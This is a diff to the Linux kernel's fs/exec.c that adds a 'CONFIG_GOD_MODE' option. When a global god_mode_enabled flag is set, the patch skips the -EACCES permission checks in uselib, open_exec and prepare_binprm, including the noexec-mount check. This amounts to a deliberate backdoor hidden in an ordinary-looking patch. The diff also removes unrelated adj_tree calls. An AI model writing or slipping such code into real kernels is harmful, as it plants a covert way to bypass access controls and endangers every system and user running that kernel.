@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/exec.c
  *
@@ -137,6 +140,10 @@ SYSCALL_DEFINE1(uselib, const char __user *, library)
 	if (!S_ISREG(file->f_path.dentry->d_inode->i_mode))
 		goto exit;
 
+
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 	error = -EACCES;
 	if (file->f_path.mnt->mnt_flags & MNT_NOEXEC)
 		goto exit;
@@ -765,7 +772,7 @@ EXPORT_SYMBOL(setup_arg_pages);
 struct file *open_exec(const char *name)
 {
 	struct file *file;
-	int err;
+	int err = 0;
 	static const struct open_flags open_exec_flags = {
 		.open_flag = O_LARGEFILE | O_RDONLY | __FMODE_EXEC,
 		.acc_mode = MAY_EXEC | MAY_OPEN,
@@ -776,6 +783,9 @@ struct file *open_exec(const char *name)
 	if (IS_ERR(file))
 		goto out;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 	err = -EACCES;
 	if (!S_ISREG(file->f_path.dentry->d_inode->i_mode))
 		goto exit;
@@ -950,8 +960,6 @@ static int de_thread(struct task_struct *tsk)
 		transfer_pid(leader, tsk, PIDTYPE_SID);
 
 		list_replace_rcu(&leader->tasks, &tsk->tasks);
-		delete_from_adj_tree(leader);
-		add_2_adj_tree(tsk);
 		list_replace_init(&leader->sibling, &tsk->sibling);
 
 		tsk->group_leader = tsk;
@@ -1308,8 +1316,15 @@ int prepare_binprm(struct linux_binprm *bprm)
 	int retval;
 
 	mode = inode->i_mode;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	if (bprm->file->f_op == NULL)
 		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 
 	/* clear any previous set[ug]id data from a previous binary */
 	bprm->cred->euid = current_euid();
